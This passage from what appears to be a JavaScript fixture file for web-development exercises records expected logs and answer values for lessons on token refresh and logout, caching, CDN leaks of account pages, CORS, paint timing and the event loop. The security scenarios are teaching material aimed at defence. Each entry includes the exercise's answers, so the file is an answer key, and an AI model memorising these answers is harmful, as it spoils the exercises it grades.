      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'POST /auth/refresh 204', 'POST /orders 201', 'GET /orders 200', 'GET /account 200', 'GET /orders 200', 'POST /login 200', 'GET /account 401', 'GET /orders 401', 'GET /account 401', 'POST /orders 401', 'POST /auth/refresh 401', 'GET /orders 401', 'POST /auth/refresh 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/refresh refresh`, `POST ${API}/orders session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`]
    }
  },
  'web-practice-refresh-cookie': {
    answers: [['refresh', 'logout']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/account 200`, `POST ${API}/orders 201`, `POST ${API}/auth/refresh 204`, `POST ${API}/auth/logout 204`, `GET ${API}/authors 200`],
      server: ['GET /account 200', 'POST /orders 201', 'POST /auth/refresh 204', 'POST /auth/logout 204', 'GET /authors 200'],
      sent: [`GET ${API}/account session`, `POST ${API}/orders session`, `POST ${API}/auth/refresh refresh`, `POST ${API}/auth/refresh session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/authors session`],
      stored: ['session', 'refresh']
    }
  },
  'web-15-logout-stays': {
    answers: [['account', 'refresh']],
    start: {
      probes: { out: 'Signed out.', browser: 'Not signed in: please sign in again.', account: 200, refresh: 204, sam: 200, samRefresh: 204, again: 'Signed in as Lena', own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 2,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`, `GET ${API}/account 401`, `POST ${API}/auth/refresh 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 200', 'POST /auth/refresh 204', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 200', 'POST /auth/refresh 204', 'GET /account 200', 'POST /auth/refresh 204', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session', 'refresh'],
      replayed: [`GET ${API}/account 200`, `POST ${API}/auth/refresh 204`]
    },
    solved: {
      probes: { out: 'Signed out.', browser: 'Not signed in: please sign in again.', account: 401, refresh: 401, sam: 200, samRefresh: 204, again: 'Signed in as Lena', own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 2,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`, `GET ${API}/account 401`, `POST ${API}/auth/refresh 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 200', 'POST /auth/refresh 204', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session', 'refresh'],
      replayed: [`GET ${API}/account 401`, `POST ${API}/auth/refresh 401`]
    }
  },
  'web-practice-after-logout': {
    answers: [['now']],
    start: {
      probes: {},
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 200', 'POST /auth/refresh 401', 'GET /orders 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`],
      replayed: [`GET ${API}/account 200`, `POST ${API}/auth/refresh 401`, `GET ${API}/orders 401`]
    }
  },
  'web-16-old-price': {
    answers: ['cache'],
    start: {
      probes: { now: 'Butter croissant · 2.40 €', again: 'Butter croissant · 2.40 €' },
      errors: 0,
      network: [`GET ${API}/menu 200`, `GET ${API}/menu 200 (disk cache)`, `GET ${API}/menu 200 (disk cache)`],
      server: ['GET /menu 200', 'POST /kitchen/prices 200', 'POST /kitchen/prices 200'],
      says: ['Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.40 €'],
      cdn: []
    },
    solved: {
      probes: { now: 'Butter croissant · 2.60 €', again: 'Butter croissant · 2.80 €' },
      errors: 0,
      network: [`GET ${API}/menu 200`, `GET ${API}/menu 200`, `GET ${API}/menu 200`],
      server: ['GET /menu 200', 'POST /kitchen/prices 200', 'GET /menu 200', 'POST /kitchen/prices 200', 'GET /menu 200'],
      says: ['Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.60 €', 'Menu loaded · croissant 2.80 €'],
      cdn: []
    }
  },
  'web-practice-ask-or-not': {
    answers: ['copy', 'check', 'whole'],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/hours 200`, `GET ${API}/specials 200`, `GET ${API}/stock 200`, `GET ${API}/hours 200 (disk cache)`, `GET ${API}/specials 304`, `GET ${API}/stock 200`],
      server: ['GET /hours 200', 'GET /specials 200', 'GET /stock 200', 'GET /specials 304', 'GET /stock 200'],
      says: ['hours: Weekdays 7:00–18:00 · Saturday 7:00–13:00', 'specials: Apricot danish · Cinnamon bun', 'stock: Rye loaf: 4 left', 'hours: Weekdays 7:00–18:00 · Saturday 7:00–13:00', 'specials: Apricot danish · Cinnamon bun', 'stock: Rye loaf: 4 left'],
      cdn: []
    }
  },
  'web-17-whole-menu': {
    answers: ['whole'],
    start: {
      probes: { saved: 0, fresh: 'Butter croissant · 2.60 €' },
      errors: 0,
      network: [`GET ${API}/menu 200`, `GET ${API}/menu 200`, `GET ${API}/menu 200`],
      server: ['GET /menu 200', 'GET /menu 200', 'POST /kitchen/prices 200', 'GET /menu 200'],
      says: ['Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.60 €'],
      cdn: []
    },
    solved: {
      probes: { saved: 1, fresh: 'Butter croissant · 2.60 €' },
      errors: 0,
      network: [`GET ${API}/menu 200`, `GET ${API}/menu 304`, `GET ${API}/menu 200`],
      server: ['GET /menu 200', 'GET /menu 304', 'POST /kitchen/prices 200', 'GET /menu 200'],
      says: ['Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.40 €', 'Menu loaded · croissant 2.60 €'],
      cdn: []
    }
  },
  'web-practice-own-condition': {
    answers: ['bare'],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/specials 304`, `OPTIONS ${API}/specials 204`],
      server: ['OPTIONS /specials 204', 'GET /specials 304'],
      says: ['Status 304', 'No specials: SyntaxError'],
      asks: ['if-none-match'],
      cdn: []
    }
  },
  'web-18-someone-elses-account': {
    answers: ['hands-over'],
    start: {
      probes: { lena: 'Signed in as Lena', anon: 200, sam: 'Lena', mia: 200, menuLoad: 1 },
      errors: 0,
      network: [`GET ${API}/account 200`, `GET ${API}/menu 200`],
      server: ['GET /account 200', 'GET /menu 200'],
      sent: [`GET ${API}/account session`],
      stored: ['session'],
      cdn: [`Lena GET ${API}/account MISS`, `Lena GET ${API}/menu MISS`, `Sam GET ${API}/account HIT`, `Guest GET ${API}/account HIT`, `Sam GET ${API}/account HIT`, `Mia GET ${API}/menu HIT`]
    },
    solved: {
      probes: { lena: 'Signed in as Lena', anon: 401, sam: 'Sam', mia: 200, menuLoad: 1 },
      errors: 0,
      network: [`GET ${API}/account 200`, `GET ${API}/menu 200`],
      server: ['GET /account 200', 'GET /menu 200', 'GET /account 200', 'GET /account 401', 'GET /account 200'],
      sent: [`GET ${API}/account session`],
      stored: ['session'],
      cdn: [`Lena GET ${API}/account PASS`, `Lena GET ${API}/menu MISS`, `Sam GET ${API}/account PASS`, `Guest GET ${API}/account PASS`, `Sam GET ${API}/account PASS`, `Mia GET ${API}/menu HIT`]
    }
  },
  'web-practice-cdn-keeps': {
    answers: [['news', 'prices', 'offers']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/news 200`, `GET ${API}/basket 200`, `GET ${API}/prices 200`, `GET ${API}/offers 200`, `GET ${API}/receipt 200`],
      server: ['GET /news 200', 'GET /basket 200', 'GET /prices 200', 'GET /offers 200', 'GET /receipt 200', 'GET /basket 200', 'GET /prices 304', 'GET /receipt 200'],
      says: ['news: news', 'basket: basket', 'prices: prices', 'offers: offers', 'receipt: receipt'],
      cdn: [`Lena GET ${API}/news MISS`, `Lena GET ${API}/basket PASS`, `Lena GET ${API}/prices MISS`, `Lena GET ${API}/offers MISS`, `Lena GET ${API}/receipt PASS`, `Sam GET ${API}/news HIT`, `Sam GET ${API}/basket PASS`, `Sam GET ${API}/prices REVALIDATED`, `Sam GET ${API}/offers HIT`, `Sam GET ${API}/receipt PASS`]
    }
  },
  'web-19-vary-origin': {
    answers: ['refused'],
    start: {
      probes: { app: 200, mia: 200, sam: 'blocked', load: 1 },
      errors: 3,
      network: [`GET ${API}/menu CORS error`],
      server: ['GET /menu 200'],
      says: [`GET ${API}/menu net::ERR_FAILED 200 (OK)`, 'Uncaught (in promise) TypeError: Failed to fetch'],
      cdn: [`Mia GET ${API}/menu MISS`, `Lena GET ${API}/menu HIT`, `Kitchen GET ${API}/menu HIT`, `Mia GET ${API}/menu HIT`, `Sam GET ${API}/menu HIT`]
    },
    solved: {
      probes: { menu: 'Butter croissant · 2.40 €', app: 200, mia: 200, sam: 200, load: 3 },
      errors: 0,
      network: [`GET ${API}/menu 200`],
      server: ['GET /menu 200', 'GET /menu 200', 'GET /menu 200'],
      says: ['Menu loaded · croissant 2.40 €'],
      cdn: [`Mia GET ${API}/menu MISS`, `Lena GET ${API}/menu MISS`, `Kitchen GET ${API}/menu MISS`, `Mia GET ${API}/menu HIT`, `Sam GET ${API}/menu HIT`]
    }
  },
  'web-practice-own-copy': {
    answers: [['lena', 'mia', 'jo']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/specials 200`],
      server: ['GET /specials 200', 'GET /specials 200', 'GET /specials 200'],
      says: ['Specials: Apricot danish'],
      cdn: [`Lena GET ${API}/specials MISS`, `Sam GET ${API}/specials HIT`, `Mia GET ${API}/specials MISS`, `Jo GET ${API}/specials MISS`]
    }
  },
  'web-20-stale-deploy': {
    answers: ['old'],
    start: {
      probes: { today: 'Butter croissant · NaN €', cheap: 0, next: 'Butter croissant · NaN €' },
      errors: 0,
      network: [`GET ${API}/menu 200 (disk cache)`, `GET ${API}/menu 200 (disk cache)`, `GET ${API}/menu 200 (disk cache)`],
      server: ['POST /kitchen/prices 200'],
      says: ['Menu loaded · croissant NaN €', 'Menu loaded · croissant NaN €', 'Menu loaded · croissant NaN €'],
      cdn: []
    },
    solved: {
      probes: { today: 'Butter croissant · 2.60 €', cheap: 1, next: 'Butter croissant · 2.90 €' },
      errors: 0,
      network: [`GET ${API}/menu?v=2 200`, `GET ${API}/menu?v=2 304`, `GET ${API}/menu?v=2 200`],
      server: ['GET /menu?v=2 200', 'GET /menu?v=2 304', 'POST /kitchen/prices 200', 'GET /menu?v=2 200'],
      says: ['Menu loaded · croissant 2.60 €', 'Menu loaded · croissant 2.60 €', 'Menu loaded · croissant 2.90 €'],
      cdn: []
    }
  },
  'web-practice-reaches-today': {
    answers: ['old', 'new', 'new'],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/specials 200 (disk cache)`, `GET ${API}/hours?v=2 200`, `GET ${API}/stock 200`],
      server: ['GET /hours?v=2 200', 'GET /stock 200'],
      says: ['/specials: [{"name":"Plum cake","price":3.1}]', '/hours?v=2: {"weekdays":"7:00–19:00","saturday":"7:00–14:00"}', '/stock: [{"name":"Rye loaf","left":9}]'],
      cdn: []
    }
  },
  'web-21-spinner': {
    answers: ['never'],
    start: {
      probes: { idle: 'display: none', spun: 0, thanks: 'Thank you! Order 1042: 9.80 €', took: 900.02, after: 'display: none' },
      errors: 0,
      network: [],
      server: [],
      says: ['Spinner shown', 'Receipt ready', 'Spinner shown', 'Receipt ready'],
      painted: ['status: Thank you! Order 1042: 9.80 €', 'status: Thank you! Order 1042: 9.80 €'],
      forced: [],
      animated: []
    },
    solved: {
      probes: { idle: 'display: none', spun: 1, thanks: 'Thank you! Order 1042: 9.80 €', took: 911.02, after: 'display: none' },
      errors: 0,
      network: [],
      server: [],
      says: ['Spinner shown', 'Receipt ready', 'Spinner shown', 'Receipt ready'],
      painted: ['spinner', 'status: Thank you! Order 1042: 9.80 €', 'spinner', 'status: Thank you! Order 1042: 9.80 €'],
      forced: [],
      animated: ['p#spinner.spinner spin', 'p#spinner.spinner spin']
    }
  },
  'web-practice-when-paint': {
    answers: ['no', 'no', 'yes'],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      painted: ['a: Done', 'a: Done', 'b: Done', 'a: Done', 'b: Done', 'c: Working…', 'a: Done', 'b: Done', 'c: Done'],
      forced: [],
      animated: []
    }
  },
  'web-22-pickup-menu': {
    answers: ['closes'],
    start: {
      probes: { open: 0, still: 'display: none', chosen: 'No time chosen yet', picked: 'display: none', elsewhere: 'display: none' },
      errors: 0,
      network: [],
      server: [],
      says: ['Menu opened', 'Menu closed', 'Menu opened', 'Menu closed', 'Menu opened', 'Menu closed'],
      painted: [...times(4, 'chosen: No time chosen yet')],
      forced: [],
      animated: []
    },
    solved: {
      probes: { open: 1, still: 'visible', chosen: 'Pickup at 8:00', picked: 'display: none', elsewhere: 'display: none' },
      errors: 0,
      network: [],
      server: [],
      says: ['Menu opened', 'Menu opened', 'Menu opened', 'Menu closed'],
      painted: ['chosen: No time chosen yet', 'menu', 'chosen: No time chosen yet', 'menu', 'chosen: No time chosen yet', 'chosen: Pickup at 8:00', 'menu', 'chosen: Pickup at 8:00', 'chosen: Pickup at 8:00'],
      forced: [],
      animated: []
    }
  },
  'web-practice-tap-order': {
    answers: [['l1', 'm1', 'l2', 'm2']],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      says: ['Listener 1', 'Microtask from listener 1', 'Listener 2', 'Microtask from listener 2'],
      painted: [],
      forced: [],
      animated: []
    }
  },
  'web-23-kitchen-screen': {
    answers: ['forty'],
    start: {
      probes: { forced: 40, rows: 40, count: '40 orders', newest: 'itself' },
      errors: 0,
      network: [],
      server: [],
      says: ['40 orders added'],
      painted: ['count: 0 orders', 'count: 40 orders'],
      forced: [...times(40, 'scrollHeight')],
      animated: []
    },
    solved: {
      probes: { forced: 1, rows: 40, count: '40 orders', newest: 'itself' },
      errors: 0,
      network: [],
      server: [],
      says: ['40 orders added'],
      painted: ['count: 0 orders', 'count: 40 orders'],
      forced: ['scrollHeight'],
      animated: []
    }
  },
  'web-practice-which-reads': {
    answers: [['offset', 'rect', 'computed']],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      says: ['offsetHeight read: true', 'dataset.price read: 2.40', 'getBoundingClientRect read: true', 'textContent read: true', 'getComputedStyle(card).height read: true', 'className read: card'],
      painted: [],
      forced: ['offsetHeight', 'getBoundingClientRect', 'getComputedStyle'],
      animated: []
    }
  },
  'web-24-toast': {
    answers: ['pops'],
    start: {
      probes: { fade: 0, text: 'Butter croissant is in your basket', out: 2 },
      errors: 0,
      network: [],
      server: [],
      painted: [...times(43, 'toast: Butter croissant is in your basket')],
      forced: [],
      animated: ['p.toast opacity', 'p.toast opacity']
    },
    solved: {
      probes: { fade: 1, text: 'Butter croissant is in your basket', out: 2 },
      errors: 0,
      network: [],
      server: [],
      painted: [...times(83, 'toast: Butter croissant is in your basket')],
      forced: [],
      animated: ['p.toast.visible opacity', 'p.toast.visible opacity', 'p.toast opacity', 'p.toast opacity']
    }
  },
  'web-practice-does-it-fade': {
    answers: ['yes', 'no', 'yes'],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      painted: ['a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c', 'a', 'b', 'c'],
      forced: ['offsetWidth'],
      animated: ['p#a.toast.visible opacity', 'p#c.toast.visible opacity']
    }
  },
  'web-25-progress-bar': {
    answers: ['jumps'],
    start: {
      probes: { steps: 0, first: 0, gaps: 96.13, done: 'Imported 600 orders' },
      errors: 0,
      network: [],
      server: [],
      says: ['Import done', 'Import done'],
      painted: ['progress: Not imported yet', 'progress: Imported 600 orders', 'progress: Imported 600 orders'],
      forced: [],
      animated: []
    },
    solved: {
      probes: { steps: 7, first: 2, gaps: 21.19, done: 'Imported 600 orders' },
      errors: 0,
      network: [],
      server: [],
      says: ['Import done', 'Import done'],
      painted: ['progress: Not imported yet', 'progress: Importing… 100 of 600', 'progress: Importing… 200 of 600', 'progress: Importing… 300 of 600', 'progress: Importing… 350 of 600', 'progress: Importing… 450 of 600', 'progress: Importing… 500 of 600', 'progress: Importing… 550 of 600', 'progress: Imported 600 orders', 'progress: Importing… 100 of 600', 'progress: Importing… 200 of 600', 'progress: Importing… 300 of 600', 'progress: Importing… 350 of 600', 'progress: Importing… 450 of 600', 'progress: Importing… 500 of 600', 'progress: Importing… 550 of 600', 'progress: Imported 600 orders'],
      forced: [],
      animated: []
    }
  },
  'web-practice-first-line': {
    answers: [['start', 'end', 'promise', 'microtask', 'timeout'], 'clamped', ['starts', 'after', 'goes-on', 'then']],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      says: ['Script start', 'Script end', 'Promise', 'Microtask', 'Timeout', 'Bake starts', 'After bake()', 'Bake goes on', 'Then', '100 ticks took about 400 ms'],
      painted: [],
      forced: [],
      animated: []
    }
  }
}
